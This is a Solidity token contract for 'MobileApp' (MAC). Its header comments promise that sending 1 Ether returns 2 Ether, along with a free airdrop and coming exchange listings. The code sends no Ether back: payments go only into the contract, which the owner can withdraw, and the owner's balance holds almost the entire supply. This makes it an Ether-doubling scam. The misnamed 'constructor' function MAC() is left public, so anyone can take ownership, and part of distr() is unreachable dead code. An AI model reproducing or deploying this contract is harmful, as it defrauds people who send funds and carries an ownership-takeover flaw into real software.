1 pragma solidity ^0.4.22;
2 // []Fuction Double ETH
3 // []=> Send 1 Ether to this Contract address and you will get 2 Ether from balance
4 // [Balance]=> 0x0000000000000000000000000000000000000000
5 
6 // *Listing coinmarketcap & coingecko if the address contract storage reaches 5 ether*
7 
8 // Send 0 ETH to this contract address 
9 // you will get a free MobileAppCoin
10 // every wallet address can only claim 1x
11 // Balance MobileAppCoin => 0x0000000000000000000000000000000000000000
12 
13 // MobileAppCoin
14 // website: http://mobileapp.tours
15 // Twitter: https://twitter.com/mobileappcoin
16 // contact: support@mobileapp.tours
17 // Telegram: https://t.me/mobileapptours
18 // Linkedin: https://www.linkedin.com/in/mobile-app-285211163/
19 // Medium: https://medium.com/@mobileappcoin
20 // Comingsoon : https://coinmarketcap.com/currencies/MAC/
21 //              https://www.coingecko.com/en/coins/MAC/            
22 
23 
24 library SafeMath {
25   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
26     uint256 c = a * b;
27     assert(a == 0 || c / a == b);
28     return c;
29   }
30 
31   function div(uint256 a, uint256 b) internal pure returns (uint256) {
32     uint256 c = a / b;
33     return c;
34   }
35 
36   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
37     assert(b <= a);
38     return a - b;
39   }
40 
41   function add(uint256 a, uint256 b) internal pure returns (uint256) {
42     uint256 c = a + b;
43     assert(c >= a);
44     return c;
45   }
46 }
47 
48 contract MobileAppCoin {
49     function balanceOf(address _owner) constant public returns (uint256);
50     function transfer(address _to, uint256 _value) public returns (bool);
51 }
52 
53 contract ERC20Basic {
54     uint256 public totalSupply;
55     function balanceOf(address who) public constant returns (uint256);
56     function transfer(address to, uint256 value) public returns (bool);
57     event Transfer(address indexed from, address indexed to, uint256 value);
58 }
59 
60 contract ERC20 is ERC20Basic {
61     function allowance(address owner, address spender) public constant returns (uint256);
62     function transferFrom(address from, address to, uint256 value) public returns (bool);
63     function approve(address spender, uint256 value) public returns (bool);
64     event Approval(address indexed owner, address indexed spender, uint256 value);
65 }
66 
67 interface Token { 
68     function distr(address _to, uint256 _value) external returns (bool);
69     function totalSupply() constant external returns (uint256 supply);
70     function balanceOf(address _owner) constant external returns (uint256 balance);
71 }
72 
73 contract MobileApp is ERC20 {
74 
75  
76     
77     using SafeMath for uint256;
78     address owner = msg.sender;
79 
80     mapping (address => uint256) balances;
81     mapping (address => mapping (address => uint256)) allowed;
82     mapping (address => bool) public blacklist;
83 
84     string public constant name = "MobileApp";
85     string public constant symbol = "MAC";
86     uint public constant decimals = 18;
87     
88 uint256 public totalSupply = 9999999999999e18;
89     
90 uint256 public totalDistributed = 9999999999998e18;
91     
92 uint256 public totalRemaining = totalSupply.sub(totalDistributed);
93     
94 uint256 public value = 100000e18;
95 
96 
97 
98     event Transfer(address indexed _from, address indexed _to, uint256 _value);
99     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
100     
101     event Distr(address indexed to, uint256 amount);
102     event DistrFinished();
103     
104     event Burn(address indexed burner, uint256 value);
105 
106     bool public distributionFinished = false;
107     
108     modifier canDistr() {
109         require(!distributionFinished);
110         _;
111     }
112     
113     modifier onlyOwner() {
114         require(msg.sender == owner);
115         _;
116     }
117     
118     modifier onlyWhitelist() {
119         require(blacklist[msg.sender] == false);
120         _;
121     }
122     
123     function MAC() public {
124         owner = msg.sender;
125         balances[owner] = totalDistributed;
126     }
127     
128     function transferOwnership(address newOwner) onlyOwner public {
129         if (newOwner != address(0)) {
130             owner = newOwner;
131         }
132     }
133     
134     function finishDistribution() onlyOwner canDistr public returns (bool) {
135         distributionFinished = true;
136         emit DistrFinished();
137         return true;
138     }
139     
140     function distr(address _to, uint256 _amount) canDistr private returns (bool) {
141         totalDistributed = totalDistributed.add(_amount);
142         totalRemaining = totalRemaining.sub(_amount);
143         balances[_to] = balances[_to].add(_amount);
144         emit Distr(_to, _amount);
145         emit Transfer(address(0), _to, _amount);
146         return true;
147         
148         if (totalDistributed >= totalSupply) {
149             distributionFinished = true;
150         }
151     }
152     
153     function () external payable {
154         getTokens();
155      }
156     
157     function getTokens() payable canDistr onlyWhitelist public {
158         if (value > totalRemaining) {
159             value = totalRemaining;
160         }
161         
162         require(value <= totalRemaining);
163         
164         address investor = msg.sender;
165         uint256 toGive = value;
166         
167         distr(investor, toGive);
168         
169         if (toGive > 0) {
170             blacklist[investor] = true;
171         }
172 
173         if (totalDistributed >= totalSupply) {
174             distributionFinished = true;
175         }
176         
177         value = value.div(100000).mul(99999);
178     }
179 
180     function balanceOf(address _owner) constant public returns (uint256) {
181         return balances[_owner];
182     }
183 
184     modifier onlyPayloadSize(uint size) {
185         assert(msg.data.length >= size + 4);
186         _;
187     }
188     
189     function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
190         require(_to != address(0));
191         require(_amount <= balances[msg.sender]);
192         
193         balances[msg.sender] = balances[msg.sender].sub(_amount);
194         balances[_to] = balances[_to].add(_amount);
195         emit Transfer(msg.sender, _to, _amount);
196         return true;
197     }
198     
199     function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
200         require(_to != address(0));
201         require(_amount <= balances[_from]);
202         require(_amount <= allowed[_from][msg.sender]);
203         
204         balances[_from] = balances[_from].sub(_amount);
205         allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
206         balances[_to] = balances[_to].add(_amount);
207         emit Transfer(_from, _to, _amount);
208         return true;
209     }
210     
211     function approve(address _spender, uint256 _value) public returns (bool success) {
212         if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
213         allowed[msg.sender][_spender] = _value;
214         emit Approval(msg.sender, _spender, _value);
215         return true;
216     }
217     
218     function allowance(address _owner, address _spender) constant public returns (uint256) {
219         return allowed[_owner][_spender];
220     }
221     
222     function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
223         MobileAppCoin t = MobileAppCoin(tokenAddress);
224         uint bal = t.balanceOf(who);
225         return bal;
226     }
227     
228     function withdraw() onlyOwner public {
229         uint256 etherBalance = address(this).balance;
230         owner.transfer(etherBalance);
231     }
232     
233     function burn(uint256 _value) onlyOwner public {
234         require(_value <= balances[msg.sender]);
235 
236         address burner = msg.sender;
237         balances[burner] = balances[burner].sub(_value);
238         totalSupply = totalSupply.sub(_value);
239         totalDistributed = totalDistributed.sub(_value);
240         emit Burn(burner, _value);
241     }
242     
243     function withdrawMobileAppCoin(address _tokenContract) onlyOwner public returns (bool) {
244         MobileAppCoin token = MobileAppCoin(_tokenContract);
245         uint256 amount = token.balanceOf(address(this));
246         return token.transfer(owner, amount);
247     }
248 }